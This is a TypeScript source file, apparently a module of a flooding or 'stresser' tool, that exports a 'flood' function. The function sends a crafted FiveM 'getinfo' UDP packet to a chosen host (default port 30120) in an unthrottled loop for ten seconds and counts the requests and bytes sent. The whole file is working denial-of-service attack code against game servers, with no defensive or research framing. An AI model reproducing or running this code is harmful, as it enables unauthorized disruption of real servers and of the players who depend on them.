import * as dgram from "dgram"

function parseUrl(url: string): { host: string; port: number } {
  const u = new URL(url.startsWith("http") ? url : `http://${url}`)
  return {
    host: u.hostname,
    port: parseInt(u.port) || 30120,
  }
}

const FIVEM_PAYLOAD = Buffer.from([
  0xff, 0xff, 0xff, 0xff, 0x67, 0x65, 0x74, 0x69, 0x6e, 0x66, 0x6f, 0x20,
  0x78, 0x78, 0x78, 0x00, 0x00, 0x00, 0x00
])

export async function flood(
  url: string,
  _rpc: number,
  onStats: (req: number, bytes: number) => void
): Promise<void> {
  const { host, port } = parseUrl(url)

  return new Promise((resolve) => {
    const sock = dgram.createSocket("udp4")
    const send = () => {
      try {
        sock.send(FIVEM_PAYLOAD, port, host, () => {
          onStats(1, FIVEM_PAYLOAD.length)
          setImmediate(send)
        })
      } catch {
        sock.close()
        resolve()
      }
    }
    sock.on("error", () => resolve())
    send()
    setTimeout(() => {
      sock.close()
      resolve()
    }, 10000)
  })
}
